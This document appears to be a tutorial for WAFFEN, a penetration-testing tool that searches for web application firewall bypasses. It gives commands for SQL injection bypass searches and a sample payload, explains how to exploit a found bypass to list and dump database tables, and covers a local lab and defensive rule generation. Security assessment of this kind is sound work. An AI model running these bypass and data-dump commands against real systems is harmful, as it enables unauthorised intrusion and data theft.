# WAFFEN Tutorial — Your First WAF Bypass Assessment

## Prerequisites

- Python 3.10+
- `curl` installed
- (Optional) Docker for the CRS lab

## Step 1: Install

```bash
git clone https://github.com/akhatkulov/WAFFEN.git
cd WAFFEN
python3 -m venv .venv
.venv/bin/pip install -e .
```

Or via Docker:
```bash
docker run --rm akhatkulov/waffen --help
```

## Step 2: Auto Mode (Easiest Start)

```bash
waffen auto --target https://your-target.com --path /search
```

The wizard runs 5 phases automatically:
1. **Fingerprint** — identifies the WAF product
2. **Calibrate** — learns block/pass response signatures
3. **Score probe** — maps keyword detection thresholds
4. **Gap scan** — finds database-specific token blind spots
5. **Bypass search** — beam search with 236 mutators × 26 transforms

## Step 3: Targeted Bypass Search

```bash
waffen bypass --target https://your-target.com \
  --path /search --param q \
  --class "SQL Injection" \
  --calibrate --verify --exploit-guided \
  --strategy beam --max-requests 500 \
  --out findings.jsonl
```

Key flags:
- `--calibrate` — learn what "blocked" looks like
- `--verify` — confirm bypasses actually exploit
- `--exploit-guided` — prefer payloads that cause backend errors
- `--strategy rl` — use the RL agent for adaptive learning

## Step 4: Exploit a Bypass

```bash
waffen exploit --target https://your-target.com \
  --path /search --param q \
  --bypass-payload "' GLOB '*" \
  --bypass-chain "ast_sqlite_swap" \
  --tables
```

Then dump data:
```bash
waffen exploit ... --table Users --dump --limit 10
```

## Step 5: Generate a Report

```bash
waffen report --findings findings.jsonl --html report.html \
  --title "WAF Assessment — Example Corp"
```

## Step 6: Fix the Bypass (Defensive)

```bash
waffen defend --findings findings.jsonl \
  --engine modsecurity --out rules.conf
```

## Lab Setup (Recommended)

```bash
cd lab/
docker compose -p waffen-lab up -d
waffen bypass --target http://localhost:18080 \
  --path /rest/products/search --param q \
  --class "SQL Injection" --calibrate --verify
```

## Next Steps

- `waffen fuzz` — high-speed wordlist testing
- `waffen plan --goal dump_database` — multi-step attack planning
- `waffen daemon --interval 6 --webhook SLACK_URL` — continuous monitoring
- `waffen plugin create my-bypass` — build custom mutators
